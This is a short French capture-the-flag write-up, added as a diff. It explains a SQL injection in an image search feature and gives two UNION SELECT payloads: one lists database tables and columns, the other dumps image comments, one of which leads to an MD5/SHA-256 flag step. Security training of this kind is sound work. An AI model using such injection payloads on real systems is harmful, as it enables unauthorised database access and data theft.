@@ -1,0 +1,8 @@
+Dans search image, une faille sql permet d'acceder a toutes les colonnes de toutes tables :
+1 union select table_name, column_name from information_schema.columns
+
+Puis on recupere les commentaires de chaque image avec :
+1 union select title, comment from Member_images.list_images
+
+Enfin, l'un des commentaires est "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46" donc on decode le flag avec md5 puis on encode avec sha256
+ 
